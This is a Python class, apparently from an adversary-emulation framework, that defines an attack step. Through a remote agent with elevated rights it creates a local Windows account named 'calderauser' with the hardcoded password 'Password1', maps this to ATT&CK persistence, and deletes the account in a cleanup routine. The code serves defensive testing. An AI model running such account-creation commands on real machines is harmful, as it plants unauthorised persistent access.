class NetUser(Step):
    """
    Description:
        This step creates a local account on the local target machine, using the 'net user' command.
    Requirements:
        Requires administrative access to the target machine.
    """
    attack_mapping = [('T1136', 'Persistence'), ('T1059', 'Execution')]
    display_name = "net_user_local"
    summary = 'Locally add a user using the command "net user"'

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host")))]
    postconditions = [("user_g", OPUser)]

    significant_parameters = ['host'] #Host is the significant parameter so it runs once per host

    preproperties = ['rat.username']
    postproperties = ["user_g.username", "user_g.is_group", "user_g.sid"]

    @staticmethod
    def description(rat, host):
        return "Creating local user calderauser on {} with net user".format(host.hostname)

    @staticmethod
    async def action(operation, rat, host, user_g): #variables from pre- and postconditions go here
        cmd = ['user','calderauser','Password1','/ADD']
        await operation.execute_shell_command(rat, net.net(cmd), lambda x: ())
        await user_g({'username': 'calderauser'})
        return True

    @staticmethod
    async def cleanup(cleaner, host, user_g):
        # remove the local user added and set the system back to what it was before
        cmd = ['user','calderauser','/DEL']
        await cleaner.run_on_agent(host, net.net(cmd), lambda x: ())
        return True
